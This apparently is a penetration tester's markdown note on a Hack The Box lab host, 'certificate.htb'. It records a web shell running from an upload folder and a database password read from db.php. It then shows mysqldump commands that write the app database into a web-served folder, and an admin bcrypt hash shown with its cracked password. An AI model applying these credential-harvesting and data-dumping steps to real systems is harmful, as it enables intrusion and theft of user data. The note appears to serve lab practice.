---
title: xamppuser
type: user
---

### xamppuser

#### validated credentials

```yaml credentials
- login: certificate.htb
  user: xamppuser
  password: pass
  nt_hash: fffffffffffffffffffffffffffffffffff
```

#### information

```
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\certificate.htb\static\uploads\3d5dfb6bb35fa5aac68ce740f272b777>'whomami' is not recognized as an internal or external command,
operable program or batch file.

C:\xampp\htdocs\certificate.htb\static\uploads\3d5dfb6bb35fa5aac68ce740f272b777>
USER INFORMATION
----------------

User Name             SID                                          
===================== =============================================
certificate\xamppuser S-1-5-21-515537669-4223687196-3249690583-1130


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled
```

```php
C:\xampp\htdocs\certificate.htb>type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

try mysql exe on C:\xampp\mysql\bin>.\mysql.exe

```sh
.\mysql.exe -h localhost -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e 'show databases;'

.\mysqldump.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" --databases Certificate_WEBAPP_DB > C:\xampp\htdocs\certificate.htb\static\1.sql

```

admin hash 

```
(10, 'Sara', 'Brawn', 'sara.b', 'sara.b@certificate.htb'
		, '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6', '2024-12-26 05:31:26', 'admin', 1),
$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
```

[[sara.b]]

#### Privileges / roles / groups 






